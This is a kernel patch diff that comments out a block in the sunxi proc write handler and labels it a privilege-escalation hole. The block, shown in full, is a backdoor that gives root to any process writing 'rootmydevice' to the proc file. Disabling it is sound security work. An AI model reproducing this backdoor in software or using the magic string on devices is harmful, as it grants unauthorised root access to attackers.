@@ -37,7 +37,15 @@ static int sunxi_proc_su_write(struct file *file, const char __user *buffer,
 		kfree(buf);
 		return -EFAULT;
 	}
-
+	
+	/*
+	
+	COMMENTED! THIS CODE ALLOWS FOR PRIVILEGE ESCALATION!
+	
+	http://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/
+	
+	Note: This entire file should probably be removed
+	
 	if(!strncmp("rootmydevice",(char*)buf,12)){
 		cred = (struct cred *)__task_cred(current);
 		cred->uid = 0;
@@ -50,6 +58,7 @@ static int sunxi_proc_su_write(struct file *file, const char __user *buffer,
 		cred->fsgid = 0;
 		printk("now you are root\n");
 	}
+	*/
 
 	kfree(buf);
 	return count;
